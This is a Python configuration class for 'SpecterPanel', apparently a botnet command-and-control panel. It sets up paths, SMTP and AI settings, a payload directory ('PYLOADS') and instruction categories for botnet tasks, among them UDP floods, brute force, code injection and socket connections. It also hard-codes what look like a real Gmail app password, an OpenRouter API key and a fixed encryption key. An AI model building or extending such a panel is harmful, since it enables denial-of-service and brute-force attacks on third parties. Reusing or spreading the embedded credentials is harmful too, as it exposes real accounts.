# =========================================================================== #
# Author: Omer Kemal                                                          #
# =========================================================================== #

import sys
import os
import secrets
import string
import tempfile


class Setting:
    """
    The Setting class handles application-wide configurations such as:
    - Secure key generation
    - Logging and database paths
    - SMTP/email settings
    - Default flags and modes
    """

    def __init__(self):
        self.setting_var()
        self._initialize_paths()

    def _initialize_paths(self):
        """
        Ensures required directories for logs and database are created.
        """
        os.makedirs(self.LOG_DIR, exist_ok=True)
        os.makedirs(self.DB_DIR, exist_ok=True)

        # FIX: ensure static dir exists (prevents crash)
        if hasattr(self, "STATIC_DIR"):
            os.makedirs(self.STATIC_DIR, exist_ok=True)

    def _resolve_path(self, relative_path):
        """
        Resolves an absolute path that works during both development and
        when running as a PyInstaller bundle.
        """

        if hasattr(sys, '_MEIPASS'):
            base_path = sys._MEIPASS
        else:
            # FIX: reliable base path for WSGI (PythonAnywhere)
            base_path = os.path.dirname(os.path.abspath(__file__))
            base_path = os.path.abspath(os.path.join(base_path, ".."))

        return os.path.join(base_path, relative_path)

    def setting_var(self):
        """
        Initializes all configuration variables.
        """

        # ------------------ SECURITY ------------------ #
        self.SECRAT_KEY = ''.join(
            secrets.choice(string.ascii_letters + string.digits)
            for _ in range(100)
        )

        # ------------------ PATHS ------------------ #
        self.DB_DIR = "db"
        self.LOG_DIR = "logs"

        # ------------------ LOGGING ------------------ #
        self.LOG_FILE_NAME = "log.txt"
        self.LOG_FILE_PATH = os.path.join(self.LOG_DIR, self.LOG_FILE_NAME)

        # ------------------ DATABASE ------------------ #
        self.DB_NAME = "SpecterPanel.db"
        self.DB_URI = f"sqlite:///{os.path.join(self.DB_DIR, self.DB_NAME)}"

        # ------------------ JSON ------------------ #
        self.JSON_FILE_PATH = os.path.join(self.DB_DIR, "info.json")

        # ------------------ EMAIL ------------------ #
        self.ADMIN_EMAIL = 'omerkemal2019@gmail.com'
        self.EMAIL_PASSWORD = 'vxoz uanm krad ukjh'
        self.EMAIL = 'omerkemal2019@gmail.com'
        self.SMTP_USE_TLS = True
        self.SMTP_LINK = 'smtp.gmail.com'
        self.SMTP_PORT = 587
        self.EMAIL_TYPE = "html"

        # ------------------ ENCRYPTION ------------------ #
        self.ENCRYPTION_KEY = b'W\xb7a\xab\xf7\xd9\xd2\xf0\x8b\xcb\xea\xc3\x93G\xbdS'

        # ------------------ STATIC FILES (FIXED) ------------------ #
        self.STATIC_DIR = self._resolve_path("static/py")

        if not os.path.exists(self.STATIC_DIR):
            os.makedirs(self.STATIC_DIR, exist_ok=True)

        try:
            self.PYLOADS = os.listdir(self.STATIC_DIR)
        except Exception:
            self.PYLOADS = []

        # ------------------ APP SETTINGS ------------------ #
        self.DELAY = 15
        self.CHECK_UPDATE = ['checked', 'unchecked']
        self.CMD_CONDION = {True: "1", False: "0"}

        # ------------------ AI ------------------ #
        self.OPENROUTER_API_URL_MODELS_LIST = "https://openrouter.ai/api/v1/models"
        self.API_KEY_AI = "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"

        # ------------------ INSTRUCTIONS ------------------ #
        self.INSTRACTION = ['connectToWeb', 'connectBySocket', 'BotNet', 'codeInjection']
        self.INSTRACTION_TYPE = ['CMD', 'BotNet', 'CodeInjection', 'Web', 'Socket']
        self.INSTRACTION_BOTNET_CATEGORY = ['udp-flood', 'bruteForce']

        # ------------------ STATUS ------------------ #
        self.STUTAS = ['Active', 'Inactive']
        self.BOTNET_STATUS = ['pending', 'inprogrec', 'complit']
        self.ACTION_TYPE = ['udp-flood', 'socket', 'bruteForce']
        self.CONDEITION = ['pending', 'inprogrec', 'complit']

    def ID(self, n=5):
        """
        Generates a random alphanumeric ID.
        """
        return ''.join(
            secrets.choice(string.ascii_letters + string.digits)
            for _ in range(n)
        )